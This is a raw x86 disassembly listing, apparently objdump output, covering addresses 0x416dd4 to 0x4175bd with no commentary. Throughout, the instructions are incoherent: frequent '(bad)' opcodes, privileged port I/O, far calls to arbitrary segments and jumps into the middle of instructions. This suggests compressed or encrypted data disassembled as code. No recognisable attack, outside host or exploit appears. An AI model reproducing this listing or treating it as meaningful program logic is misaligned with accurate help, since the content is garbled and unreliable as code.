  416dd4:	jo     0x416e1f
  416dd6:	call   0x491d:0x29109547
  416ddd:	xchg   ebp,eax
  416dde:	sti    
  416ddf:	sub    BYTE PTR [edx-0x5c],cl
  416de2:	mov    dh,BYTE PTR [ebp+0x63]
  416de5:	jle    0x416dd5
  416de7:	ret    
  416de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416de9:	jb     0x416dd3
  416deb:	dec    ecx
  416dec:	out    0xca,eax
  416dee:	adc    esp,DWORD PTR [ecx+0x7b46e54c]
  416df4:	ja     0x416dea
  416df6:	clc    
  416df7:	test   eax,0x39899ecb
  416dfc:	fsubr  st,st(7)
  416dfe:	sub    BYTE PTR [ebx],0xc3
  416e01:	cmp    BYTE PTR [ebp-0x76],al
  416e04:	les    esi,FWORD PTR [esi]
  416e06:	ret    0x7369
  416e09:	sbb    eax,eax
  416e0b:	xor    al,0xd7
  416e0d:	lock cmc 
  416e0f:	(bad)
  416e13:	jmp    0x2f419c1a
  416e18:	je     0x416e0c
  416e1a:	inc    ebp
  416e1b:	int3   
  416e1c:	in     al,0x4
  416e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e1f:	jae    0xebeec811
  416e25:	add    ch,BYTE PTR [ebp+0x58b6b345]
  416e2b:	or     DWORD PTR [edi+0x27],ebp
  416e2e:	xor    dh,BYTE PTR [esi+0x40]
  416e31:	jns    0x416e72
  416e33:	nop
  416e34:	push   es
  416e35:	dec    edx
  416e36:	(bad)  
  416e38:	lock xchg esi,eax
  416e3a:	push   esp
  416e3b:	sbb    ecx,DWORD PTR [ecx]
  416e3d:	js     0x416e07
  416e3f:	sti    
  416e40:	push   eax
  416e41:	rol    DWORD PTR [ecx+0x9],0x94
  416e45:	out    dx,eax
  416e46:	fild   QWORD PTR [edx+edx*8+0x52]
  416e4a:	xor    edi,ebx
  416e4c:	cmc    
  416e4d:	iret   
  416e4e:	cmp    BYTE PTR [esi+0x44],cl
  416e51:	jns    0x416e0c
  416e53:	cmp    al,0x94
  416e55:	cmp    DWORD PTR [esi],0x0
  416e58:	aas    
  416e59:	out    dx,al
  416e5a:	repnz push ebx
  416e5c:	loop   0x416e6d
  416e5e:	pusha  
  416e5f:	pop    ds
  416e60:	mov    ecx,0x9bd7928b
  416e65:	inc    esi
  416e66:	xor    bh,BYTE PTR [ecx+0xe]
  416e69:	repz pusha 
  416e6b:	pusha  
  416e6c:	ret    0x1cc0
  416e6f:	das    
  416e70:	push   ds
  416e71:	call   0x755c:0x6cacdeb7
  416e78:	retf   0xe7aa
  416e7b:	mov    eax,0xe56e46bb
  416e80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e81:	pop    esi
  416e82:	rol    esp,0xc2
  416e85:	mov    es,WORD PTR [ecx-0x28]
  416e88:	inc    ebp
  416e89:	and    eax,DWORD PTR [edi+0x7]
  416e8c:	dec    edi
  416e8d:	xchg   ebp,eax
  416e8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e8f:	mov    edi,0x1be08f4c
  416e94:	sub    ebp,DWORD PTR es:[ebx-0x16]
  416e98:	xchg   esi,eax
  416e99:	das    
  416e9a:	mov    esi,0xda518dd2
  416e9f:	jle    0x416f20
  416ea1:	rcl    cl,cl
  416ea3:	inc    ecx
  416ea4:	inc    edx
  416ea5:	arpl   ax,sp
  416ea7:	pop    ds
  416ea8:	lods   al,BYTE PTR ds:[esi]
  416ea9:	loop   0x416f16
  416eab:	in     eax,dx
  416eac:	add    al,0x37
  416eae:	clc    
  416eaf:	rcr    DWORD PTR [ebx],0x10
  416eb2:	(bad)  
  416eb4:	sbb    edx,esp
  416eb6:	gs repz jmp 0x416e56
  416eba:	mov    ds:0xbc300100,al
  416ebf:	jp     0x416f0d
  416ec1:	retf   0x81d4
  416ec4:	fist   WORD PTR [ebx+eiz*1]
  416ec7:	shl    BYTE PTR [ecx+0xbdf6cc3],0x73
  416ece:	mov    cl,0x4e
  416ed0:	pop    esp
  416ed1:	outs   dx,DWORD PTR ds:[esi]
  416ed2:	push   ds
  416ed3:	enter  0x36f9,0x50
  416ed7:	cmp    esp,DWORD PTR ds:0x89dc5015
  416edd:	pop    edi
  416ede:	pop    esp
  416edf:	retf   0xd6c4
  416ee2:	dec    ebp
  416ee3:	loope  0x416e65
  416ee5:	(bad)  
  416ee6:	loopne 0x416f3e
  416ee8:	cmp    DWORD PTR [ecx-0x12],eax
  416eeb:	ss pop es
  416eed:	not    DWORD PTR [ebp-0x2589246d]
  416ef3:	pop    eax
  416ef4:	cmp    DWORD PTR [ecx],0x31
  416ef7:	in     al,0xcb
  416ef9:	inc    ebp
  416efa:	sub    ah,al
  416efc:	push   ds
  416efd:	loope  0x416f74
  416eff:	out    dx,eax
  416f00:	and    edx,DWORD PTR [ebx]
  416f02:	xchg   esp,eax
  416f03:	ds mov ebp,0x1a273e
  416f09:	cmp    BYTE PTR [eax-0x4ed902f2],bl
  416f0f:	pushf  
  416f10:	sar    DWORD PTR [ebp+0x54],cl
  416f13:	mov    edi,0xa8397ff7
  416f18:	adc    BYTE PTR [ecx-0x2ae490e4],dl
  416f1e:	mov    fs,WORD PTR [eax+esi*1+0x2d9066fe]
  416f25:	mov    ch,BYTE PTR [ebx-0x5a89abc2]
  416f2b:	mov    ebp,0x5f56275b
  416f30:	fcom   QWORD PTR [ebx+edx*1]
  416f33:	xor    ecx,DWORD PTR [edx+0x5f2cfcb1]
  416f39:	xchg   BYTE PTR [ebx-0x5190b1dc],dh
  416f3f:	dec    ebp
  416f40:	ss mov dl,0xbb
  416f43:	ins    DWORD PTR es:[edi],dx
  416f44:	push   ss
  416f45:	xlat   BYTE PTR ds:[ebx]
  416f46:	or     DWORD PTR [edx-0x1a28599e],eax
  416f4c:	aas    
  416f4d:	pusha  
  416f4e:	mov    esi,ebp
  416f50:	lods   eax,DWORD PTR ds:[esi]
  416f51:	cmp    DWORD PTR [ebx+0x401c0b6a],0xa9a82090
  416f5b:	sub    BYTE PTR [edx],ch
  416f5d:	js     0x416f96
  416f5f:	and    DWORD PTR ss:[ecx],0x41b4a5eb
  416f66:	and    DWORD PTR [edi+edx*8],ebx
  416f69:	jle    0x416f2c
  416f6b:	add    eax,0xf95f939f
  416f70:	cmp    BYTE PTR [edx+ecx*2+0x7d651f8d],dl
  416f77:	jg     0x416f05
  416f79:	sbb    ch,BYTE PTR [ebp+0x71]
  416f7c:	add    dl,BYTE PTR [ecx+0x34]
  416f7f:	scas   al,BYTE PTR es:[edi]
  416f80:	xchg   ebx,eax
  416f81:	inc    ebx
  416f82:	push   esi
  416f83:	mov    ds:0x18d017de,al
  416f88:	cmp    dh,BYTE PTR [ecx]
  416f8a:	repnz push eax
  416f8c:	sub    esp,DWORD PTR [eax-0xf]
  416f8f:	pop    eax
  416f90:	aam    0xa1
  416f92:	inc    esi
  416f93:	push   edi
  416f94:	popf   
  416f95:	xchg   ebp,eax
  416f96:	loopne 0x416f62
  416f98:	jecxz  0x416f79
  416f9a:	bound  ebx,QWORD PTR [edi+ebp*2]
  416f9d:	or     al,0xa7
  416f9f:	ret    0xeeeb
  416fa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fa3:	xchg   esi,eax
  416fa4:	popf   
  416fa5:	ret    
  416fa6:	push   esp
  416fa7:	sub    BYTE PTR [ebp+0x62],dl
  416faa:	cmp    DWORD PTR [ebp+0x2bea5031],eax
  416fb0:	rol    DWORD PTR ds:0x4ebffe3c,cl
  416fb6:	push   es
  416fb7:	repz and DWORD PTR [ebx-0x19ab74b9],edx
  416fbe:	mov    ds:0x146c050d,al
  416fc3:	jne    0x416f48
  416fc5:	jne    0x416f81
  416fc7:	jnp    0x416faa
  416fc9:	fucomi st,st(3)
  416fcb:	mov    ebx,0x755f7d9
  416fd0:	lods   al,BYTE PTR ds:[esi]
  416fd1:	ds push ss
  416fd3:	mov    ebp,0x21c0679e
  416fd8:	(bad)  
  416fd9:	or     bl,bh
  416fdb:	shl    DWORD PTR [ebp+0x5e09e03f],1
  416fe1:	mov    edx,esi
  416fe3:	or     ebp,ebp
  416fe5:	sbb    dl,ch
  416fe7:	imul   edx,DWORD PTR [edi],0x9b4495aa
  416fed:	xor    dh,ch
  416fef:	mov    edi,0xc3a5dde2
  416ff4:	jecxz  0x416f9a
  416ff6:	cmp    DWORD PTR [ecx],esi
  416ff8:	test   eax,0x8eb2d95
  416ffd:	or     al,0x76
  416fff:	mov    dl,0x12
  417001:	sahf   
  417002:	data16 daa 
  417004:	mov    ebp,0x104747ae
  417009:	popa   
  41700a:	push   eax
  41700b:	sbb    edi,DWORD PTR [ebp+0x39cb105a]
  417011:	sbb    esi,DWORD PTR [ebx+0x472ea5bf]
  417017:	nop
  417018:	mov    eax,0x916db2e
  41701d:	add    DWORD PTR [edx-0x39907ed7],ecx
  417023:	push   ebp
  417024:	lea    esp,[eax*1-0x41012634]
  41702b:	lock push esp
  41702d:	mov    es,edx
  41702f:	sub    ecx,DWORD PTR [ebp-0x45]
  417032:	jbe    0x416ff3
  417034:	adc    DWORD PTR [ebx-0x6300ac58],edx
  41703a:	jb     0x417028
  41703c:	jl     0x41705c
  41703e:	fwait
  41703f:	cmp    BYTE PTR [ebp-0x64c47ec],dh
  417045:	mov    ebx,0x3ac30d22
  41704a:	mov    eax,ds:0x61ed5ded
  41704f:	fldcw  WORD PTR [ebp-0x61642d27]
  417055:	fs sbb al,0x98
  417058:	sbb    bl,BYTE PTR [ebx-0x2ede016f]
  41705e:	scas   eax,DWORD PTR es:[edi]
  41705f:	sub    DWORD PTR ds:0x879d9523,esi
  417065:	pop    ebp
  417066:	fimul  DWORD PTR [eax]
  417068:	xchg   ebx,ebx
  41706a:	inc    ebx
  41706b:	js     0x417049
  41706d:	addr16 push ds
  41706f:	sub    DWORD PTR gs:[edx+0x771022bb],edi
  417076:	xor    edi,DWORD PTR [esi+0x13]
  417079:	std    
  41707a:	retf   
  41707b:	stos   BYTE PTR es:[edi],al
  41707c:	add    DWORD PTR [eax+0xb752b86],ebp
  417082:	fs out dx,eax
  417084:	sbb    dh,bl
  417086:	mov    eax,0x21178f23
  41708b:	es xchg ecx,eax
  41708d:	dec    ebp
  41708e:	pop    es
  41708f:	xchg   dl,ch
  417091:	push   0x75d4efe3
  417096:	cmp    ecx,DWORD PTR [edi]
  417098:	xor    BYTE PTR [edx-0x678ec97f],0xca
  41709f:	ret    0x63b2
  4170a2:	dec    edx
  4170a3:	call   0x2da9:0xd5ee3991
  4170aa:	push   edi
  4170ab:	xchg   edi,eax
  4170ac:	test   al,0x8a
  4170ae:	push   ebp
  4170af:	mov    ?,WORD PTR [esp+ecx*1+0x24a37f5c]
  4170b6:	mov    ecx,0x347d461d
  4170bb:	xchg   esp,eax
  4170bc:	inc    ebp
  4170bd:	iret   
  4170be:	ins    BYTE PTR es:[edi],dx
  4170bf:	mov    cl,0xf4
  4170c1:	ret    
  4170c2:	loopne 0x41706f
  4170c4:	(bad)
  4170c7:	xor    bh,bl
  4170c9:	out    dx,eax
  4170ca:	and    eax,0x3695c115
  4170cf:	dec    edx
  4170d0:	aad    0xcb
  4170d2:	or     edx,DWORD PTR [eax+0x3e]
  4170d5:	(bad)  
  4170d7:	dec    edi
  4170d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170d9:	mov    al,ds:0x8de93e48
  4170de:	sub    al,0x1b
  4170e0:	int    0x9b
  4170e2:	xor    al,0xc5
  4170e4:	outs   dx,DWORD PTR ds:[esi]
  4170e5:	mov    ecx,0xcd24d220
  4170ea:	mov    al,dh
  4170ec:	ins    DWORD PTR es:[edi],dx
  4170ed:	jns    0x417089
  4170ef:	dec    esp
  4170f0:	sahf   
  4170f1:	add    bh,BYTE PTR [ebx+0x1ed1f96f]
  4170f7:	xchg   edx,eax
  4170f8:	adc    edi,DWORD PTR [edx-0x65ffd294]
  4170fe:	(bad)  
  4170ff:	iret   
  417100:	cli    
  417101:	in     eax,0x57
  417103:	jbe    0x4170e2
  417105:	jp     0x41712c
  417107:	je     0x4170dc
  417109:	xor    edi,ebx
  41710b:	jl     0x4170bd
  41710d:	ins    BYTE PTR es:[edi],dx
  41710e:	pop    edx
  41710f:	add    ecx,edx
  417111:	aam    0xe1
  417113:	leave  
  417114:	push   esp
  417115:	(bad)  
  417116:	jecxz  0x41714a
  417118:	pop    es
  417119:	rcr    DWORD PTR [ebp-0x9b3681f],0x6d
  417120:	mov    dh,0xcb
  417122:	lds    ebp,FWORD PTR [eax]
  417124:	jns    0x41711a
  417126:	(bad)  
  417128:	push   ds
  417129:	push   ds
  41712a:	xor    edx,ebx
  41712c:	pushf  
  41712d:	stc    
  41712e:	out    dx,eax
  41712f:	aam    0x54
  417131:	test   edx,edx
  417133:	int    0x44
  417135:	adc    dh,BYTE PTR [esi-0xdbea538]
  41713b:	in     eax,0x2
  41713d:	les    eax,FWORD PTR [edi+eax*8+0x4858a447]
  417144:	outs   dx,DWORD PTR ds:[esi]
  417145:	(bad)  
  417146:	sub    ch,BYTE PTR [ebx-0x6cef8fe7]
  41714c:	add    ebp,DWORD PTR [ebp-0x24]
  41714f:	sub    ebp,DWORD PTR [edi+0x967ef9c]
  417155:	mov    esi,0xf711265f
  41715a:	push   ecx
  41715b:	jno    0x417198
  41715d:	fnsave [eax*8-0x4b344d57]
  417164:	mov    ch,0x85
  417166:	jg     0x417150
  417168:	adc    al,bh
  41716a:	mov    ebp,0xf9ffd5cb
  41716f:	push   esi
  417170:	push   ebx
  417171:	dec    eax
  417172:	std    
  417173:	jne    0x41716f
  417175:	and    eax,0x574c1857
  41717a:	sub    eax,DWORD PTR [edx]
  41717c:	push   edi
  41717d:	std    
  41717e:	mov    cl,0x8
  417180:	iret   
  417181:	cdq    
  417182:	pop    es
  417183:	cld    
  417184:	dec    edi
  417185:	add    ebp,esi
  417187:	js     0x4171be
  417189:	push   0x5299f3d7
  41718e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41718f:	fidivr DWORD PTR [edx]
  417191:	lods   eax,DWORD PTR ds:[esi]
  417192:	jne    0x4171a4
  417194:	lea    ebx,[ecx-0x5f]
  417197:	fld    QWORD PTR [ebx+0x2c]
  41719a:	or     cl,ch
  41719c:	adc    BYTE PTR [ebp-0x23],al
  41719f:	clc    
  4171a0:	sub    DWORD PTR [ebx-0x46],edx
  4171a3:	push   esp
  4171a4:	push   es
  4171a5:	cmp    al,0x7a
  4171a7:	xor    cl,ch
  4171a9:	iret   
  4171aa:	int    0xbd
  4171ac:	sbb    bh,dl
  4171ae:	loopne 0x417159
  4171b0:	mov    esi,es
  4171b2:	loop   0x4171b8
  4171b4:	stos   DWORD PTR es:[edi],eax
  4171b5:	pop    ds
  4171b6:	repz push ebp
  4171b8:	test   BYTE PTR [esi+0x14b505b8],0xeb
  4171bf:	out    dx,al
  4171c0:	pusha  
  4171c1:	jne    0x417176
  4171c3:	xchg   eax,ebp
  4171c5:	xchg   BYTE PTR [ebx+0x0],ah
  4171c8:	xor    DWORD PTR [ebx+0x214323c7],esp
  4171ce:	retf   
  4171cf:	pop    eax
  4171d0:	mov    ds:0x5900a248,eax
  4171d5:	jecxz  0x4171d3
  4171d7:	icebp  
  4171d8:	mov    ebx,0xb5662091
  4171dd:	xchg   DWORD PTR [ebx-0x53],eax
  4171e0:	and    BYTE PTR [ebp+0x73],ah
  4171e3:	out    dx,al
  4171e4:	shr    DWORD PTR [edi+0x79b94b3b],1
  4171ea:	xchg   ecx,eax
  4171eb:	pop    esi
  4171ec:	and    al,0x91
  4171ee:	xor    DWORD PTR [ecx+0x4e12321],edi
  4171f4:	adc    esp,DWORD PTR [ebp+0x7e5f9ea4]
  4171fa:	jne    0x417216
  4171fc:	(bad)  
  4171fd:	in     eax,dx
  4171fe:	mov    DWORD PTR [edi+0x3d],ebx
  417201:	sub    al,0xa2
  417203:	out    0x3,al
  417205:	mov    ebx,0x4c786772
  41720a:	stc    
  41720b:	jne    0x4171cc
  41720d:	jl     0x4171f8
  41720f:	imul   edx,DWORD PTR [ecx+0x32],0x735e3edc
  417216:	jp     0x4171fd
  417218:	inc    edx
  417219:	bnd jo 0x417222
  41721c:	jnp    0x417233
  41721e:	(bad)  
  41721f:	call   0xfd7c306b
  417224:	xchg   BYTE PTR [esi-0x630ea52c],dh
  41722a:	cmp    bl,bh
  41722c:	mov    esp,0xf618e72c
  417231:	xor    eax,0xaf84f8d8
  417236:	test   eax,0x860c5149
  41723b:	mov    edi,0xf6f84071
  417240:	retf   
  417241:	ja     0x4171f6
  417243:	ds daa 
  417245:	repnz frstpm(287 only) 
  417248:	or     BYTE PTR [edx],al
  41724a:	jge    0x417229
  41724c:	popf   
  41724d:	add    BYTE PTR [eax],ch
  41724f:	lock add ebx,DWORD PTR [eax-0x55]
  417253:	pop    esp
  417254:	mulps  xmm4,XMMWORD PTR [eax-0x2f]
  417258:	inc    edi
  417259:	push   ss
  41725a:	sub    DWORD PTR [edx],esp
  41725c:	je     0x4171f8
  41725e:	(bad)  
  41725f:	push   ds
  417260:	clc    
  417261:	mov    esi,0x788a3499
  417266:	jbe    0x417224
  417268:	int3   
  417269:	in     eax,0x47
  41726b:	jae    0x417244
  41726d:	add    eax,0x4316b386
  417272:	xchg   ebp,eax
  417273:	mov    edi,0x740ee909
  417278:	sub    al,BYTE PTR [eax-0x1d]
  41727b:	pop    eax
  41727c:	cmp    ebp,DWORD PTR [edi+0x22]
  41727f:	mov    esp,edx
  417281:	push   cs
  417282:	imul   ebp,ecx,0x97a71dad
  417288:	mov    dl,0x62
  41728a:	mov    al,ds:0xf7910872
  41728f:	mov    edx,0x2f416d2e
  417295:	dec    ecx
  417296:	dec    ecx
  417297:	pop    ss
  417298:	pop    ebx
  417299:	pop    ebx
  41729a:	push   es
  41729b:	cmp    DWORD PTR [ebp+0x3c],0x2
  41729f:	mov    ecx,0x5df8b17
  4172a4:	rol    ebp,1
  4172a6:	jmp    0x417274
  4172a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172a9:	push   0x6aa85399
  4172ae:	data16 adc BYTE PTR [edi+0x53],bl
  4172b2:	xor    eax,0x4216d4f0
  4172b7:	adc    eax,0xc044163d
  4172bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172bd:	inc    esp
  4172be:	adc    eax,0x67d7f73a
  4172c3:	lahf   
  4172c4:	lds    ecx,FWORD PTR [edi+0x37]
  4172c7:	sbb    BYTE PTR [esi-0x60],0x52
  4172cb:	cmp    DWORD PTR [esi-0x63602bdd],0xffffffdd
  4172d2:	or     BYTE PTR [esp+edx*4],al
  4172d5:	repnz fisttp WORD PTR [ebp-0x56]
  4172d9:	mov    al,0x21
  4172db:	and    DWORD PTR [ecx+ebp*8],ebp
  4172de:	xor    DWORD PTR [eax+edi*2-0x79],ecx
  4172e2:	pop    ebx
  4172e3:	cmp    eax,0xe571abfb
  4172e8:	push   esi
  4172e9:	push   DWORD PTR [edx+0x6]
  4172ec:	outs   dx,BYTE PTR ds:[esi]
  4172ed:	sub    dl,BYTE PTR [eax-0x24989816]
  4172f3:	pop    ds
  4172f4:	sbb    BYTE PTR [edi-0x6c31bb68],dh
  4172fa:	int3   
  4172fb:	ds aad 0xf
  4172fe:	adc    al,0x4b
  417300:	js     0x4172ca
  417302:	out    0x32,eax
  417304:	data16 add BYTE PTR [esi],dl
  417307:	push   cs
  417308:	jmp    0x12f6db75
  41730d:	jmp    DWORD PTR [edx]
  41730f:	sbb    BYTE PTR [eax-0x31bf8ef9],dh
  417315:	aad    0xdc
  417317:	into   
  417318:	and    DWORD PTR [ecx+0x48619fa9],ecx
  41731e:	out    0x5f,al
  417320:	push   cs
  417321:	ret    0xe4c8
  417324:	mov    bh,0xbc
  417326:	inc    ebp
  417327:	scas   al,BYTE PTR es:[edi]
  417328:	retf   
  417329:	jmp    0xd27a:0x9e4325b5
  417330:	int3   
  417331:	in     eax,dx
  417332:	pop    ds
  417333:	pop    esp
  417334:	popf   
  417335:	sar    BYTE PTR [edi],cl
  417337:	mov    ebx,0x2779c607
  41733c:	mov    edi,0x22ea09dd
  417341:	adc    cl,bl
  417343:	inc    esi
  417344:	push   ebp
  417345:	les    ecx,FWORD PTR [ecx+0x10]
  417348:	fsub   DWORD PTR [esi+0x4c]
  41734b:	in     eax,0x1c
  41734d:	stos   DWORD PTR es:[edi],eax
  41734e:	jnp    0x4173bd
  417350:	or     eax,0x1a3ce69f
  417355:	ja     0x4172e9
  417357:	scas   eax,DWORD PTR es:[edi]
  417358:	mov    esp,0xf1e675a7
  41735d:	sar    cl,cl
  41735f:	dec    eax
  417360:	inc    ebp
  417361:	rol    ah,0xe8
  417364:	push   ecx
  417365:	adc    al,0x3e
  417367:	sbb    DWORD PTR [edx-0xc6cf5e4],eax
  41736d:	(bad)  [eax+ebp*8-0x1]
  417371:	test   DWORD PTR [edx],eax
  417373:	lods   eax,DWORD PTR ds:[esi]
  417374:	dec    ebx
  417375:	jecxz  0x41738e
  417377:	sub    BYTE PTR [edi-0x65],ah
  41737a:	(bad)  
  41737b:	sti    
  41737c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41737d:	fidiv  DWORD PTR [ecx+0x16]
  417380:	and    al,0x50
  417382:	push   ebx
  417383:	rol    DWORD PTR [esi-0x7c1a77de],cl
  417389:	outs   dx,DWORD PTR ds:[esi]
  41738a:	adc    eax,0xf3b2b189
  41738f:	iret   
  417390:	inc    ebp
  417391:	sbb    DWORD PTR [esi],esi
  417393:	nop
  417394:	inc    ecx
  417395:	cmp    DWORD PTR [ebp+0x5f],0xffffffc2
  417399:	xor    ebx,DWORD PTR [edi+0x1e]
  41739c:	cs retf 
  41739e:	data16 stos BYTE PTR es:[edi],al
  4173a0:	xor    ecx,DWORD PTR [esi-0x4694bdf]
  4173a6:	scas   al,BYTE PTR es:[edi]
  4173a7:	in     al,0x20
  4173a9:	sub    cl,BYTE PTR [edi+ecx*2]
  4173ac:	sub    al,ch
  4173ae:	sub    ebp,DWORD PTR gs:[ebp+0x7bb6e142]
  4173b5:	sub    ecx,ebx
  4173b7:	clc    
  4173b8:	cli    
  4173b9:	imul   ebx,DWORD PTR [edx+0x4524ba2c],0x691ccf2d
  4173c3:	arpl   WORD PTR [ebp+0x17d67849],sp
  4173c9:	inc    eax
  4173ca:	and    esp,edi
  4173cc:	xchg   esi,eax
  4173cd:	xchg   ebp,eax
  4173ce:	sub    al,0xbc
  4173d0:	cmp    cl,BYTE PTR [ebx+0x63]
  4173d3:	cmp    al,0x8a
  4173d5:	and    al,bh
  4173d7:	mov    ds:0x5a526575,al
  4173dc:	add    BYTE PTR [eax+0x306a3884],al
  4173e2:	pop    esi
  4173e3:	scas   al,BYTE PTR es:[edi]
  4173e4:	xchg   DWORD PTR [edi-0x7ab0572],edi
  4173ea:	repz mov ch,0xab
  4173ed:	clc    
  4173ee:	add    al,0xd3
  4173f0:	(bad)  
  4173f1:	(bad)  
  4173f3:	or     al,0x30
  4173f5:	xor    DWORD PTR [ecx+0x14],ecx
  4173f8:	fcomp  DWORD PTR [esi+0x79d1d36a]
  4173fe:	sub    BYTE PTR [esi+0x54efdaeb],cl
  417404:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417405:	mov    WORD PTR [esi-0x2683f733],ss
  41740b:	jl     0x417468
  41740d:	call   0x2200dcd6
  417412:	mov    ebp,0x221f974b
  417417:	jns    0x417445
  417419:	add    edx,DWORD PTR [esi]
  41741b:	jl     0x4173dc
  41741d:	cmc    
  41741e:	pop    ss
  41741f:	stc    
  417420:	pop    esi
  417421:	mov    ch,0xfe
  417423:	out    dx,eax
  417424:	xor    BYTE PTR [eax-0x70],dl
  417427:	imul   esi,DWORD PTR [eax+0x35278a23],0x344e747a
  417431:	clc    
  417432:	fild   WORD PTR [esi+0x54259998]
  417438:	push   ecx
  417439:	pop    eax
  41743a:	mov    esp,0xe802a2fa
  41743f:	cwde   
  417440:	push   ds
  417441:	lods   eax,DWORD PTR ds:[esi]
  417442:	dec    ebx
  417443:	inc    ecx
  417445:	ret    
  417446:	ins    DWORD PTR es:[edi],dx
  417447:	jnp    0x417472
  417449:	mov    eax,ds:0xb5c0de55
  41744e:	xlat   BYTE PTR ds:[ebx]
  41744f:	mov    al,0xf2
  417451:	sar    DWORD PTR [eax+0x5fe57788],1
  417457:	mov    ?,WORD PTR [ebp-0x6b70c33f]
  41745d:	(bad)  
  41745e:	cmc    
  41745f:	and    eax,0x92f759b1
  417464:	aas    
  417465:	adc    dl,BYTE PTR cs:[edi-0x73]
  417469:	stos   DWORD PTR es:[edi],eax
  41746a:	icebp  
  41746b:	push   esp
  41746c:	and    eax,0xf84b637a
  417471:	ret    0x6dd5
  417474:	hlt    
  417475:	adc    eax,0xdca40050
  41747a:	mov    ?,WORD PTR [eax+eiz*8-0x40]
  41747e:	pop    eax
  41747f:	(bad)  
  417480:	xlat   BYTE PTR ds:[ebx]
  417481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417482:	mov    ds:0x313eb7ea,al
  417487:	adc    eax,DWORD PTR [esi+eax*2]
  41748a:	enter  0x2eff,0x9b
  41748e:	inc    esi
  41748f:	mov    ss,WORD PTR [edx-0x68]
  417492:	fwait
  417493:	dec    edx
  417494:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417495:	cli    
  417496:	cmp    ebp,0x51
  417499:	sub    al,0x43
  41749b:	mov    ebp,0x50536d92
  4174a0:	cmp    al,BYTE PTR [ecx+ebp*4]
  4174a3:	fnstsw WORD PTR [eax+0x42]
  4174a6:	test   al,0xc
  4174a8:	stc    
  4174a9:	inc    edi
  4174aa:	(bad)  
  4174ab:	cmp    al,0x41
  4174ad:	or     DWORD PTR [esi+eiz*8],eax
  4174b0:	cdq    
  4174b1:	sti    
  4174b2:	and    BYTE PTR [ebx],dh
  4174b4:	jmp    0x784f971
  4174b9:	and    BYTE PTR [eax-0x7b],0x9f
  4174bd:	bound  edx,QWORD PTR [esi-0x22]
  4174c0:	call   0xea29:0x43fb6ca6
  4174c7:	push   ds
  4174c8:	pop    esp
  4174c9:	add    eax,0x1f1ed39a
  4174ce:	ds mov esi,0xec13eb1d
  4174d4:	mov    DWORD PTR [ebx+0x2959d875],esi
  4174da:	pop    ss
  4174db:	or     ah,dl
  4174dd:	mov    DWORD PTR [eax],esp
  4174df:	mov    ch,bh
  4174e1:	mov    eax,0x227f4c76
  4174e6:	xchg   esp,eax
  4174e7:	or     al,0x57
  4174e9:	fist   DWORD PTR [edx-0x2e39463f]
  4174ef:	sub    eax,0x285f7771
  4174f4:	(bad)  
  4174f5:	adc    ecx,DWORD PTR [ecx]
  4174f7:	aaa    
  4174f8:	daa    
  4174f9:	push   edx
  4174fa:	add    eax,0x1fee6b87
  4174ff:	cmp    DWORD PTR [edi],edx
  417501:	inc    edx
  417502:	sub    DWORD PTR [esi],esp
  417504:	call   0x999f:0x113da15a
  41750b:	xchg   ecx,eax
  41750c:	out    dx,al
  41750d:	xor    eax,0x28
  417510:	lahf   
  417511:	loope  0x417580
  417513:	pop    ebp
  417514:	xchg   ebx,eax
  417515:	ror    BYTE PTR [edx+eiz*4-0x5f],cl
  417519:	(bad)  
  41751a:	and    bl,BYTE PTR [ecx+0x79]
  41751d:	add    dl,BYTE PTR [ebp+ecx*4+0x6d]
  417521:	scas   eax,DWORD PTR es:[edi]
  417522:	xor    eax,0x876fb7f3
  417527:	icebp  
  417528:	sub    ecx,edi
  41752a:	push   ecx
  41752b:	xor    DWORD PTR [ebp+0x47],0xed9878aa
  417532:	mov    eax,ds:0x9e978d0f
  417537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417538:	sbb    BYTE PTR [ebp+ebp*2+0x1d],ah
  41753c:	retf   0xccce
  41753f:	hlt    
  417540:	inc    ebp
  417541:	loope  0x417550
  417543:	sub    eax,DWORD PTR [ebx+0x5b]
  417546:	mov    ch,0xb7
  417548:	xor    eax,0x1fd72103
  41754d:	sub    BYTE PTR [edx+0x76],cl
  417550:	ins    DWORD PTR es:[edi],dx
  417551:	lahf   
  417552:	scas   eax,DWORD PTR es:[edi]
  417553:	cwde   
  417554:	test   eax,0x80f37903
  417559:	jmp    edi
  41755b:	mov    DWORD PTR [esi+0x34b1e41],esp
  417561:	or     dl,BYTE PTR [esi]
  417563:	cmp    eax,0x5fda3ed
  417568:	inc    edx
  417569:	cmp    edx,edi
  41756b:	into   
  41756c:	xchg   DWORD PTR [esi],ebp
  41756e:	xchg   edi,eax
  41756f:	ret    
  417570:	adc    cl,dl
  417572:	mov    ah,0x1c
  417574:	dec    edx
  417575:	bound  edx,QWORD PTR [ecx+0x6d803bf8]
  41757b:	inc    esp
  41757c:	aas    
  41757d:	pop    edx
  41757e:	sub    dl,BYTE PTR [ebp-0x56]
  417581:	or     al,0x5e
  417583:	cmp    edx,DWORD PTR [ebx+0x60]
  417586:	inc    ecx
  417587:	sub    eax,0x9ead3a4c
  41758c:	out    dx,eax
  41758d:	cs pop es
  41758f:	cmc    
  417590:	bound  ecx,QWORD PTR [edx+0x23de4653]
  417596:	jl     0x41752a
  417598:	push   0xffffff82
  41759a:	mov    edi,ebx
  41759c:	sahf   
  41759d:	cmp    al,0x0
  41759f:	push   cs
  4175a0:	stc    
  4175a1:	inc    edx
  4175a2:	push   ss
  4175a3:	jo     0x41757a
  4175a5:	fild   DWORD PTR [eax]
  4175a7:	mov    ds:0xd943b042,eax
  4175ac:	mov    ds:0x87698702,al
  4175b1:	add    DWORD PTR [ecx+0x13b69028],0xd1abd203
  4175bb:	xor    ebx,DWORD PTR [edi]
  4175bd:	mov    ebp,0x59a587c0
